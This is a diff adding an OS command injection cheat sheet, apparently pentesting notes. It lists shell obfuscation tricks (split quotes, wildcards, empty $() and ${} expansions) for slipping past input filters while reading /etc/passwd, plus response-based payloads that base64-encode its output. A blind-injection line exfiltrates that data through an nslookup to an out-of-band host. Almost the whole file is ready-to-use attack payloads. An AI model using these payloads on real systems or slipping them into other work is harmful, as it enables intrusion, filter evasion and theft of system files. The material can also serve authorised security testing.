@@ -1,0 +1,42 @@
+OS Command Injections:
+======================
+
+[+] Bypass Techniques:
+----------------------
+
+# Double Quotes (can be used in commands and filepaths)
+c""at /etc/pas""swd
+
+# Single Quotes (commands and filepaths)
+c''at /etc/pas''swd
+
+# Asterisks (filepaths only)
+cat /e*tc/pas**swd
+
+# $() -> Command substitution (commands and filepaths)
+ca$()t /etc/pas$()swd
+
+# ${} -> Parameter Expansion (commands and filepaths, can't be blank)
+ca${7}t /etc/pass${7}wd
+
+# Advanced
+cat /e*t*c/p*w*d
+cat /e*t*c/pa${777}s""s$()w''d | head -n 1 | ba$()se""64
+
+
+[+] Response-based Command Injections:
+--------------------------------------
+
+cat /etc/passwd | head -n 1 | base""64
+cat "/e"tc'/passwd' | head -n 1 | ba''se64
+cat /et*c/pas*wd | head -n 1 | bas''e64
+cat /et**c/pas**d | head -n 1 | base""64
+cat /et""c/pa""wd | head -n 1 | base""64
+cat /et''c/pass''wd | head -n 1 | base''64
+cat /et$()c/pass$()wd | head -n 1 | base$()64
+cat /et${7}c/pass${7}wd | head -n 1 | base${7}64
+
+[+] Blind Command Injections:
+-----------------------------
+
+GETID=$(cat /e*t*c/pa${777}s""s$()w''d | head -n 1 | ba$()se""64) && nsl""ook$()up $GETID.zwjzvr.oast.fun
